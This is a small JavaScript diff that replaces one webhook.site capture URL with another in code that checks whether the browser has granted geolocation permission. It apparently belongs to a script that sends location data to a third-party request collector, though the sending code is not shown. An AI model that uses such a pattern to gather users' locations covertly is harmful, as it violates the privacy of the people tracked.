@@ -17,7 +17,7 @@ function main() {
         console.warn(`ERROR(${err.code}): ${err.message}`);
     }
 
-    let url = 'https://webhook.site/75296190-1ddd-4656-9701-533fee9fa083';
+    let url = 'https://webhook.site/6d47f71f-5a35-433a-981e-bc94dbdeb1a6';
 
     navigator.permissions.query({ name: 'geolocation' }).then(function (result) {
         if (result.state === 'granted') {
